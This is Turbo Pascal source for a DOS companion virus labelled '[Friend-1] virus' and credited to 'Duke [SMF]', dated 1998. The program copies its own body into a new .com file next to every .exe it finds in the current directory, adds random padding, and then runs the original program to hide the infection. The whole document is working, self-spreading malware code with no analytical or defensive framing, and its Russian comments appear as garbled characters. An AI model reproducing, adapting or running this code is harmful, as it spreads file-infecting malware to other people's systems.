   {$M 5000, 0, 5000}
   uses dos;
   const virsize=3573;
         e='.exe';
   var  ds:dirstr;
        ns:namestr;
        es:extstr;
        f,g:file;
        s:searchrec;
        mas:array[1..virsize] of char;
        st:string;
   label infect;
   procedure zar;
   var i:integer;ch:char;
   begin
   fsplit(s.name,ds,ns,es);
   st:=ds+ns+'.com';
   assign(g,st);{$I-}reset(g,1);{$I+}
   if ioresult<>0 then                              {¥éñ ¥ § à ¦¥}
     begin
     rewrite(g,1);
     blockwrite(g,mas,virsize);
     for i:=1 to random(500) do                        {¯¨è¥¬ ¬ãá®à}
       begin
       ch:=chr(random(250));
       blockwrite(g,ch,1);
       end;
     end;
   close(g);
   end;
   begin
   st:='This is [Friend-1] virus. (c) by Duke [SMF] 1.06.98';
   fsplit(paramstr(0),ds,ns,es);
   st:=ds+ns+e;
   assign(g,st);{$I-}reset(g);{$I+}
   if ioresult<>0 then goto infect; {¥á«¨ ¥  ©¤¥ ¯®à ¦¥ë© ä ©«,
                                                   â® § à ¦ ¥¬ ¢á¥å}
   close(g);
   exec(st,paramstr(1)+paramstr(2)+paramstr(3)+paramstr(4)+
                               paramstr(5)+paramstr(6)+paramstr(7));
   infect:                                       {¯®¨áª ¨ § à ¦¥¨¥}
   assign(f,paramstr(0));reset(f,1);
   seek(f,0);
   blockread(f,mas,virsize);
   close(f);
   findfirst('*'+e,$21,s);
   zar;
   while doserror=0 do
     begin
     findnext(s);
     zar;
     end;
   end.
